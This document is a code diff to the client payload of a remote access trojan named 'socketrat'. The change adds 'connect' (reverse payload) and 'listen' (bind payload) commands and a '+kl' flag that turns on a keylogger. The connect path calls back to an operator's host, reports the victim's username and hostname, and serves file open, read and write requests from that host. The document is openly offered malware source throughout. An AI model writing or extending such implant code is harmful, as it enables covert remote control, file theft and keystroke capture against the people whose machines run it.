@@ -21,11 +21,15 @@ class ClientRPCHandler(rpc.RPCHandler):
 
 class ReverseClient:
 
-    def __init__(self, addr):
-        self.addr = addr
-        self.sock = socket.create_connection(addr)
+    def __init__(self, sock):
+        self.sock = sock
         self.connection = connection.Connection(self.sock)
         self.rpc_handler = ClientRPCHandler()
+
+    @classmethod
+    def connect(cls, addr):
+        sock = socket.create_connection(addr)
+        return cls(sock)
 
     def __enter__(self):
         return self
@@ -82,37 +86,10 @@ class FileService(payload.FileOpener, payload.FileReader, payload.FileWriter):
     pass
 
 
-def _windows_main(args):
-    raise NotImplementedError
-
-
-def _linux_main(args):
-    import argparse
-
-    parser = argparse.ArgumentParser()
-    subparsers = parser.add_subparsers(
-            dest='subcommand',
-            metavar='subcommand',
-    )
-    subparsers.required = True
-
-    connect_parser = subparsers.add_parser('connect')
-    connect_parser.add_argument('host',
-            help='the host name or ip address to connect to. '
-                 '[default: localhost]',
-            default='localhost',
-            nargs='?',
-    )
-    connect_parser.add_argument('--port', '-p',
-            help='the port number to connect to. '
-                 '[default: 8000]',
-            default=8000,
-    )
-
-    args = parser.parse_args(args)
+def _linux_connect(args):
     host, port = addr = args.host, args.port
 
-    with ReverseClient(addr) as client:
+    with ReverseClient.connect(addr) as client:
         funcs = [
                 payload.get_username,
                 payload.get_hostname,
@@ -130,6 +107,73 @@ def _linux_main(args):
             client.serve_forever()
         except connection.ConnectionClosed:
             pass
+
+
+def _linux_listen(args):
+    print(args)
+    print('listening')
+
+
+def _windows_main(args):
+    raise NotImplementedError
+
+
+def _linux_main(args):
+    import argparse
+
+    parser = argparse.ArgumentParser(
+            prefix_chars='-+',
+    )
+    payload_group = parser.add_argument_group('payload arguments')
+    payload_group.add_argument('-cd',
+            help='Turn off change directory',
+            action='store_false',
+    )
+    payload_group.add_argument('+kl',
+            help='Turn on keylogger',
+            action='store_true',
+    )
+
+    subparsers = parser.add_subparsers(
+            dest='command',
+            help='Choose from the following commands:',
+            metavar='command',
+    )
+    subparsers.required = True
+
+    connect_parser = subparsers.add_parser('connect',
+            help='Connect to a socketrat server [reverse payload]'
+    )
+    connect_parser.set_defaults(func=_linux_connect)
+    connect_parser.add_argument('host',
+            help='Specify alternate hostname or IP address '
+                 '[default: localhost]',
+            default='localhost',
+            nargs='?',
+    )
+    connect_parser.add_argument('port',
+            help='Specify alternate port [default: 8000]',
+            default=8000,
+            nargs='?',
+    )
+
+    listen_parser = subparsers.add_parser('listen',
+            help='Listen for connections from a socketrat server [bind payload]',
+    )
+    listen_parser.set_defaults(func=_linux_listen)
+    listen_parser.add_argument('--bind', '-b',
+            help='Specify alternate bind address [default: all interfaces]',
+            metavar='ADDRESS',
+            default='0.0.0.0',
+    )
+    listen_parser.add_argument('port',
+            help='Specify alternate port [default: 8000]',
+            default=8000,
+            nargs='?',
+    )
+
+    args = parser.parse_args(args)
+    args.func(args)
 
 
 if platform.system() == 'Windows':
